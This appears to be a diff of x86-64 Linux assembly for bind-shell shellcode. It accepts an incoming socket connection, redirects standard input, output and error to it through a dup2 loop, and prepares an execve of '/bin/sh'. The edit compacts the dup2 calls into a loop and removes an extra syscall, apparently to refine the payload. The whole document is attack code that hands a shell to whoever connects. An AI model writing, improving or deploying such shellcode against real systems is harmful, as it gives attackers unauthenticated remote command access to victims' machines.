@@ -37,28 +37,24 @@ _start:
 	mov BYTE al, 0x2b			; sys_accept systemcall is 43 (0x2B)
 	xor rsi,rsi
 	xor rdx,rdx
-	syscall
+	syscall						; returns the connected socket fd
 
-	push byte 0x3c
-	pop rax
-	syscall 					; returns the connected socket fd
-
-	;dup2(s, fd) x 3
+	;dup2(s, fd)
 	mov rdi,rax					; fp to connected socket
-	xor rsi,rsi					; stdin
-	push BYTE 0x21				; sys_dup2 33 (0x21)
-	pop rax
+	xor rax,rax					; clear rax
+	push 0x3
+	pop rsi	
+	
+dup_loop:
+	dec rsi
+	mov al, 0x21
 	syscall
-	mov al, 0x21			; sys_dup2 33 (0x21)
-	inc rsi						; stdout
-	syscall
-	mov al, 0x21			; sys_dup2 33 (0x21)
-	inc rsi						; stderr
-	syscall
+
+	jnz dup_loop
 
 	;execve("/bin/sh", 0, 0)
-	push 0x3b					; sys_execve
-	pop rax
+	push 0x3b
+	pop rax						; sys_execve
 	xor rsi,rsi
 	xor rdx,rdx
 	mov rdi, 0x68732f6e69622f2f	; "hs/nib//"
